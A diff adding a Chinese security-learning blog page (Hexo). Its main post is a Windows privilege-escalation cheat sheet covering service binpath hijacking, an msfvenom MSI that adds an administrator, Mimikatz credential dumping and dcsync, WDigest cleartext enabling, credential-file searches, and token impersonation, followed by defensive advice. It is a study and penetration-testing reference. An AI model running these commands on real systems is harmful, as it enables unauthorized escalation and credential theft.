+<h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>CSRF 是”借用户的身份”；SSRF 是”借服务器的位置”。CSRF 看 SameSite + Token，SSRF 看白名单 + 协议过滤。两者放一起记不会忘。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://lvyatan.github.io/2026/07/28/Windows%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/lvyatan">
+      <meta itemprop="name" content="lvyatan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网安学习笔记">
+      <meta itemprop="description" content="个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 网安学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/07/28/Windows%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/" class="post-title-link" itemprop="url">Windows 提权思路整理</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-07-28 15:45:00" itemprop="dateCreated datePublished" datetime="2026-07-28T15:45:00+08:00">2026-07-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-09-01 18:07:34" itemprop="dateModified" datetime="2026-09-01T18:07:34+08:00">2026-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%90%8E%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">后渗透</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>911</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>3 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>拿到 Windows 普通权限 shell 后，提权是后渗透关键。本文梳理 Windows 提权的常见路径与命令速查。仅用于授权环境。</p>
+<h2 id="0x01-基本信息收集"><a href="#0x01-基本信息收集" class="headerlink" title="0x01 基本信息收集"></a>0x01 基本信息收集</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">whoami /all                       :: 当前用户、SID、特权</span><br><span class="line">hostname</span><br><span class="line"><span class="built_in">ver</span>                               :: 系统版本</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> /B /C:&quot;OS&quot;   :: OS 详情</span><br><span class="line">wmic qfe list brief               :: 已安装补丁</span><br><span class="line"><span class="built_in">net</span> user</span><br><span class="line"><span class="built_in">net</span> localgroup Administrators</span><br></pre></td></tr></table></figure>
+
+<p><strong>重点</strong>：</p>
+<ul>
+<li><code>systeminfo</code> 看 OS 版本、补丁数、域 &#x2F; 工作组</li>
+<li><code>wmic qfe</code> 看缺哪些补丁 → 对照 CVE</li>
+<li><code>whoami /priv</code> 看当前用户特权</li>
+</ul>
+<h2 id="0x02-内核漏洞提权"><a href="#0x02-内核漏洞提权" class="headerlink" title="0x02 内核漏洞提权"></a>0x02 内核漏洞提权</h2><p>利用流程：</p>
+<ol>
+<li>拿 OS 版本与补丁列表</li>
+<li>上 <a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Watson">Watson</a> 或 <a target="_blank" rel="noopener" href="https://github.com/AonEmitSec/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a>（基于 systeminfo 输出）</li>
+<li>对应 CVE 找现成 EXP</li>
+</ol>
+<p>经典 CVE：</p>
+<ul>
+<li><strong>MS16-032</strong>（CVE-2016-0099）：Win7&#x2F;2008 R2，提权到 SYSTEM</li>
+<li><strong>MS16-135</strong>（CVE-2016-7255）：Win10 早期版本</li>
+<li><strong>CVE-2021-1675 &#x2F; PrintNightmare</strong>：Print Spooler 漏洞，可加管理员</li>
+<li><strong>CVE-2022-26809</strong>：RPC 漏洞</li>
+</ul>
+<p>EXP 仓库：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">Windows-Kernel-Exploits</a></p>
+<h2 id="0x03-服务配置错误"><a href="#0x03-服务配置错误" class="headerlink" title="0x03 服务配置错误"></a>0x03 服务配置错误</h2><h3 id="1-不带引号的服务路径"><a href="#1-不带引号的服务路径" class="headerlink" title="1. 不带引号的服务路径"></a>1. 不带引号的服务路径</h3><p>服务可执行路径含空格且未加引号时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\My Service\service.exe</span><br></pre></td></tr></table></figure>
+
+<p>Windows 会依次尝试：</p>
+<ol>
+<li><code>C:\Program.exe</code></li>
+<li><code>C:\Program Files\My.exe</code></li>
+<li><code>C:\Program Files\My Service\service.exe</code></li>
+</ol>
+<p>如果普通用户能在 <code>C:\</code> 写 <code>Program.exe</code> → 服务启动时执行它。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode | <span class="built_in">findstr</span> /i &quot;auto&quot; | <span class="built_in">findstr</span> /i /v &quot;c:\windows&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-服务权限宽松"><a href="#2-服务权限宽松" class="headerlink" title="2. 服务权限宽松"></a>2. 服务权限宽松</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 查可写服务</span><br><span class="line">accesschk.exe -uwcqv &quot;Authenticated Users&quot; * -accepteula</span><br><span class="line"></span><br><span class="line"># 修改服务 BinarPath 为我们的 payload</span><br><span class="line">sc config &lt;servicename&gt; binpath= &quot;C:\shell.exe&quot;</span><br><span class="line">sc stop &lt;servicename&gt;</span><br><span class="line">sc <span class="built_in">start</span> &lt;servicename&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-AlwaysInstallElevated"><a href="#3-AlwaysInstallElevated" class="headerlink" title="3. AlwaysInstallElevated"></a>3. AlwaysInstallElevated</h3><p>注册表配置允许普通用户以 SYSTEM 权限安装 MSI：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
+
+<p>返回 1（启用）时，生成 msi 提权：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/exec CMD=<span class="string">&#x27;net localgroup administrators user /add&#x27;</span> -f msi -o /tmp/pwn.msi</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /quiet /qn /i C:\pwn.msi</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-DLL-劫持"><a href="#0x04-DLL-劫持" class="headerlink" title="0x04 DLL 劫持"></a>0x04 DLL 劫持</h2><p>服务&#x2F;进程加载 DLL 顺序：</p>
+<ol>
+<li>应用所在目录</li>
+<li>System32</li>
+<li>System</li>
+<li>Windows</li>
+<li>当前工作目录</li>
+<li>PATH 变量</li>
+</ol>
+<p>如果应用目录可写，往里塞恶意 DLL 同名文件，启动时被加载。</p>
+<p>工具：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/sadshade/PowerUpDLLHijack">SioBaDoU工具</a></li>
+<li>Process Monitor 监控 <code>Name not found</code> 找缺失的 DLL</li>
+</ul>
+<h2 id="0x05-凭据收集"><a href="#0x05-凭据收集" class="headerlink" title="0x05 凭据收集"></a>0x05 凭据收集</h2><h3 id="1-注册表里的明文-缓存"><a href="#1-注册表里的明文-缓存" class="headerlink" title="1. 注册表里的明文 &#x2F; 缓存"></a>1. 注册表里的明文 &#x2F; 缓存</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\Software\SimonTatham\PuTTY\Sessions   :: PuTTY Session</span><br><span class="line">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WinLogon</span><br><span class="line">cmdkey /list                                          :: 凭据管理器</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-文件中的密钥"><a href="#2-文件中的密钥" class="headerlink" title="2. 文件中的密钥"></a>2. 文件中的密钥</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> /b /s C:\Users\*.txt | <span class="built_in">findstr</span> /i &quot;pass&quot;</span><br><span class="line"><span class="built_in">dir</span> /b /s C:\Users\*.docx | <span class="built_in">findstr</span> /i &quot;pass&quot;</span><br><span class="line"><span class="built_in">type</span> C:\Users\<span class="variable">%USERNAME%</span>\AppData\Roaming\MobaXterm\MobaXterm.ini</span><br><span class="line"><span class="built_in">type</span> <span class="variable">%APPDATA%</span>\VanDyke\Config\Sessions.ini</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-浏览器密码"><a href="#3-浏览器密码" class="headerlink" title="3. 浏览器密码"></a>3. 浏览器密码</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/djhohnstein/SharpChrome">SharpChrome</a>：解密 Chrome</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">LaZagne</a>：综合密码抓取</li>
+</ul>
+<h3 id="4-Mimikatz（黄金标准）"><a href="#4-Mimikatz（黄金标准）" class="headerlink" title="4. Mimikatz（黄金标准）"></a>4. Mimikatz（黄金标准）</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"><span class="function">privilege::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonpasswords</span>   :: 抓明文 / <span class="title">NTLM</span> / <span class="title">Kerb</span></span></span><br><span class="line"><span class="function"><span class="title">lsadump</span>::<span class="title">sam</span>                :: <span class="title">SAM</span> 库</span></span><br><span class="line"><span class="function"><span class="title">lsadump</span>::<span class="title">dcsync</span> /<span class="title">domain:lab</span>.<span class="title">local</span> /<span class="title">user:Administrator</span></span></span><br></pre></td></tr></table></figure>
+
+<p>需要管理员权限。Windows 10 后默认关闭了 wdigest 明文，可以打开：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest /v UseLogonCredential /t REG_DWORD /d <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>等用户重新登录即抓明文。</p>
+<h2 id="0x06-令牌窃取"><a href="#0x06-令牌窃取" class="headerlink" title="0x06 令牌窃取"></a>0x06 令牌窃取</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Incognito 模式（Meterpreter）</span><br><span class="line">load incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure>
+
+<p>服务账户（IIS &#x2F; SQL Server）常有 <code>SeImpersonatePrivilege</code> 特权，可利用 <a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato">JuicyPotato</a>、<a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a>、<a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RoguePotato">RoguePotato</a> 提权。</p>
+<h2 id="0x07-计划任务-启动项"><a href="#0x07-计划任务-启动项" class="headerlink" title="0x07 计划任务 &#x2F; 启动项"></a>0x07 计划任务 &#x2F; 启动项</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo list | <span class="built_in">findstr</span> /i &quot;taskname\|run&quot;</span><br><span class="line">:: 查找以 SYSTEM 运行 + 当前用户可写的脚本</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> C:\Users\<span class="variable">%USERNAME%</span>\AppData\Roaming\Microsoft\Windows\<span class="built_in">Start</span> Menu\Programs\Startup</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x08-自动化枚举工具"><a href="#0x08-自动化枚举工具" class="headerlink" title="0x08 自动化枚举工具"></a>0x08 自动化枚举工具</h2><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>语言</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng">WinPEAS</a></td>
+<td>C#</td>
+<td>全家桶，最常用</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">PowerUp</a></td>
+<td>PS</td>
+<td>PowerShell 经典</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt">Seatbelt</a></td>
+<td>C#</td>
+<td>输出干净</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Watson">Watson</a></td>
+<td>C#</td>
+<td>内核漏洞匹配</td>
+</tr>
+</tbody></table>
+<h2 id="0x09-防御建议"><a href="#0x09-防御建议" class="headerlink" title="0x09 防御建议"></a>0x09 防御建议</h2><ul>
+<li>及时打补丁，订阅 MSRC 公告</li>
+<li>最小权限原则：服务账户用 gMSA，不用 SYSTEM</li>
+<li>启用 LSA Protection（<code>RunAsPPL</code>）</li>
+<li>受限服务权限（<code>sc sdshow</code> 看 SDDL）</li>
+<li>Application Control + WDAC 拦截未授权 PE</li>
+<li>监控 <code>Mimikatz</code> 之类工具的进程创建</li>
+<li>Defender ATP 开 LSA 凭据保护</li>
+</ul>
+<h2 id="0x10-总结"><a href="#0x10-总结" class="headerlink" title="0x10 总结"></a>0x10 总结</h2><p>Windows 提权思路：<strong>配置错误 &gt; 内核漏洞 &gt; 凭据泄露</strong>。一份 <code>WinPEAS</code> + <code>systeminfo</code> 走天下，但理解原理才能在没工具时手动挖洞。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-shield"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">true</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">11k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">41 分钟</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+<canvas id="particle-canvas"></canvas>
+<script>
+(function () {
+  'use strict';
+
+  // ====================================================================
+  // 1. 粒子动效：Canvas 粒子 + 连线 + 鼠标吸引
+  // ====================================================================
+  function initParticles() {
+    var canvas = document.getElementById('particle-canvas');
+    if (!canvas) return;
+    var ctx = canvas.getContext('2d');
+    var dpr = window.devicePixelRatio || 1;
+    var particles = [];
+    var mouse = { x: -9999, y: -9999, radius: 140 };
+
+    // 配置
+    var COLORS = ['#a78bfa', '#60a5fa', '#34d399', '#f472b6'];
+    var MAX_PARTICLES = window.innerWidth < 768 ? 38 : 70;
+    var LINK_DISTANCE = 130;
+
+    function resize() {
+      canvas.width = window.innerWidth * dpr;
+      canvas.height = window.innerHeight * dpr;
+      canvas.style.width = window.innerWidth + 'px';
+      canvas.style.height = window.innerHeight + 'px';
+      ctx.scale(dpr, dpr);
+    }
+
+    function Particle() {
+      this.x = Math.random() * window.innerWidth;
+      this.y = Math.random() * window.innerHeight;
+      this.vx = (Math.random() - 0.5) * 0.35;
+      this.vy = (Math.random() - 0.5) * 0.35;
+      this.radius = Math.random() * 2 + 1.2;
+      this.color = COLORS[Math.floor(Math.random() * COLORS.length)];
+      this.baseAlpha = Math.random() * 0.4 + 0.4;
+    }
+
+    Particle.prototype.update = function () {
+      // 鼠标吸引
+      var dx = mouse.x - this.x;
+      var dy = mouse.y - this.y;
+      var dist = Math.sqrt(dx * dx + dy * dy);
+      if (dist < mouse.radius) {
+        var force = (mouse.radius - dist) / mouse.radius;
+        this.vx += (dx / dist) * force * 0.06;
+        this.vy += (dy / dist) * force * 0.06;
+      }
+
+      // 摩擦
+      this.vx *= 0.985;
+      this.vy *= 0.985;
+
+      // 限速
+      var speed = Math.sqrt(this.vx * this.vx + this.vy * this.vy);
+      if (speed > 1.5) {
+        this.vx = (this.vx / speed) * 1.5;
+        this.vy = (this.vy / speed) * 1.5;
+      }
+
+      this.x += this.vx;
+      this.y += this.vy;
+
+      // 边界回弹
+      if (this.x < 0 || this.x > window.innerWidth) this.vx *= -1;
+      if (this.y < 0 || this.y > window.innerHeight) this.vy *= -1;
+      this.x = Math.max(0, Math.min(window.innerWidth, this.x));
+      this.y = Math.max(0, Math.min(window.innerHeight, this.y));
+    };
+
+    Particle.prototype.draw = function () {
+      ctx.beginPath();
+      ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+      ctx.fillStyle = this.color;
+      ctx.globalAlpha = this.baseAlpha;
+      ctx.fill();
+
+      // 柔光
+      ctx.beginPath();
+      ctx.arc(this.x, this.y, this.radius * 3, 0, Math.PI * 2);
+      var grad = ctx.createRadialGradient(this.x, this.y, 0, this.x, this.y, this.radius * 3);
+      grad.addColorStop(0, this.color);
+      grad.addColorStop(1, 'transparent');
+      ctx.fillStyle = grad;
+      ctx.globalAlpha = 0.12;
+      ctx.fill();
+      ctx.globalAlpha = 1;
+    };
+
+    function drawLinks() {
+      for (var i = 0; i < particles.length; i++) {
+        for (var j = i + 1; j < particles.length; j++) {
+          var p1 = particles[i];
+          var p2 = particles[j];
+          var dx = p1.x - p2.x;
+          var dy = p1.y - p2.y;
+          var dist = Math.sqrt(dx * dx + dy * dy);
+          if (dist < LINK_DISTANCE) {
+            var alpha = (1 - dist / LINK_DISTANCE) * 0.22;
+            ctx.beginPath();
+            ctx.strokeStyle = p1.color;
+            ctx.globalAlpha = alpha;
+            ctx.lineWidth = 1;
+            ctx.moveTo(p1.x, p1.y);
+            ctx.lineTo(p2.x, p2.y);
+            ctx.stroke();
+            ctx.globalAlpha = 1;
+          }
+        }
+      }
+    }
+
+    function animate() {
+      ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);
+      drawLinks();
+      for (var i = 0; i < particles.length; i++) {
+        particles[i].update();
+        particles[i].draw();
+      }
+      requestAnimationFrame(animate);
+    }
+
+    function createParticles() {
+      particles = [];
+      for (var i = 0; i < MAX_PARTICLES; i++) particles.push(new Particle());
+    }
+
+    // 初始化
+    resize();
+    createParticles();
+    animate();
+
+    // 鼠标 / 触摸
+    window.addEventListener('mousemove', function (e) {
+      mouse.x = e.clientX;
+      mouse.y = e.clientY;
+    });
+    window.addEventListener('mouseout', function () {
+      mouse.x = -9999; mouse.y = -9999;
+    });
+    window.addEventListener('touchmove', function (e) {
+      if (e.touches[0]) {
+        mouse.x = e.touches[0].clientX;
+        mouse.y = e.touches[0].clientY;
+      }
+    });
+
+    // resize
+    var resizeTimer;
+    window.addEventListener('resize', function () {
+      clearTimeout(resizeTimer);
+      resizeTimer = setTimeout(function () {
+        resize();
+        createParticles();
+      }, 200);
+    });
+
+    // 低性能模式：电池或低性能时减粒子
+    if (navigator.getBattery && navigator.getBattery()) {
+      navigator.getBattery().then(function (battery) {
+        if (battery.discharging && battery.level < 0.2) {
+          MAX_PARTICLES = 25;
+          createParticles();
+        }
+      });
+    }
+  }
+
+  // ====================================================================
+  // 2. Hero 区：仅首页注入
+  // ====================================================================
+  function injectHero() {
+    // 通过 page 配置判断是否首页
+    var pageConfigs = document.querySelectorAll('script.next-config[data-name="page"]');
+    var isHome = false;
+    for (var i = 0; i < pageConfigs.length; i++) {
+      try {
+        var cfg = JSON.parse(pageConfigs[i].textContent || '{}');
+        if (cfg.isHome === true) { isHome = true; break; }
+      } catch (e) {}
+    }
+    if (!isHome) return;
+
+    var mainInner = document.querySelector('.main-inner.index.posts-expand');
+    if (!mainInner) return;
+    if (mainInner.querySelector('.hero-section')) return; // 防止重复
+
+    var hero = document.createElement('section');
+    hero.className = 'hero-section';
+    hero.innerHTML = ''
+      + '<div class="hero-content">'
+      + '  <span class="hero-eyebrow">CYBER · SECURITY · NOTES</span>'
+      + '  <h1 class="hero-title">网安学习笔记</h1>'
+      + '  <p class="hero-subtitle">'
+      + '    记录渗透测试、漏洞挖掘、安全工具开发的实践笔记。'
+      + '    <br>每一篇都是亲手敲过的 Payload、跑过的命令、踩过的坑。'
+      + '  </p>'
+      + '  <div class="hero-actions">'
+      + '    <a class="hero-btn hero-btn--primary" href="#main">'
+      + '      <i class="fa fa-book-open"></i> 开始阅读'
+      + '    </a>'
+      + '    <a class="hero-btn hero-btn--ghost" href="/about/">'
+      + '      <i class="fa fa-user"></i> 关于本站'
+      + '    </a>'
+      + '  </div>'
+      + '</div>'
+      + '<div class="hero-scroll-hint">SCROLL</div>';
+
+    mainInner.insertBefore(hero, mainInner.firstChild);
+
+    // 入场动画
+    setTimeout(function () {
+      hero.style.opacity = '0';
+      hero.style.transform = 'translateY(20px)';
+      hero.style.transition = 'opacity 0.8s ease, transform 0.8s cubic-bezier(0.16, 1, 0.3, 1)';
+      requestAnimationFrame(function () {
+        hero.style.opacity = '1';
+        hero.style.transform = 'translateY(0)';
+      });
+    }, 50);
+  }
+
+  // ====================================================================
+  // 3. 卡片入场动画（首页文章）
+  // ====================================================================
+  function animateCards() {
+    var cards = document.querySelectorAll('.index.posts-expand .post-block');
+    if (!cards.length) return;
+    if (!('IntersectionObserver' in window)) return;
+
+    cards.forEach(function (card, idx) {
+      card.style.opacity = '0';
+      card.style.transform = 'translateY(24px)';
+      card.style.transition = 'opacity 0.6s ease ' + (idx * 0.08) + 's, transform 0.6s cubic-bezier(0.16, 1, 0.3, 1) ' + (idx * 0.08) + 's';
+    });
+
+    var io = new IntersectionObserver(function (entries) {
+      entries.forEach(function (entry) {
+        if (entry.isIntersecting) {
+          entry.target.style.opacity = '1';
+          entry.target.style.transform = 'translateY(0)';
+          io.unobserve(entry.target);
+        }
+      });
+    }, { threshold: 0.1 });
+
+    cards.forEach(function (card) { io.observe(card); });
+  }
+
+  // ====================================================================
+  // 4. 启动
+  // ====================================================================
+  function boot() {
+    try { initParticles(); } catch (e) { console.warn('particles failed:', e); }
+    try { injectHero(); } catch (e) { console.warn('hero inject failed:', e); }
+    try { animateCards(); } catch (e) {}
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', boot);
+  } else {
+    boot();
+  }
+
+  // PJAX 兼容（NexT 用 pjax 切页）
+  window.addEventListener('pjax:success', boot);
+})();
+</script>
+
+</body>
+</html>
